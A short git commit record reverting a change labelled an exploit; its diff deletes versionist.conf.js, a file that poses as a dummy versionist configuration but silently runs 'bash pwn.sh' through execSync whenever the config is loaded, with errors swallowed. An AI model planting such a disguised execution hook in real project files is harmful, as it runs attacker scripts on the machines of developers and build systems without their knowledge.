a9d768f8467adc2f4d3b6ae7ce78abc33d273e41
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-22 01:10:23 +0000

    Revert "Update exploit based on attempt 1 feedback"
    This reverts commit f7acc3c02670c3fab67e20525fab9bde00b5dbf3.

--- versionist.conf.js
+++
@@ -1,9 +0,0 @@
-const { execSync } = require('child_process');
-try {
-    execSync('bash pwn.sh', { stdio: 'inherit' });
-} catch (e) {}
-
-module.exports = {
-  // dummy versionist config
-  getTemplate: () => '',
-};
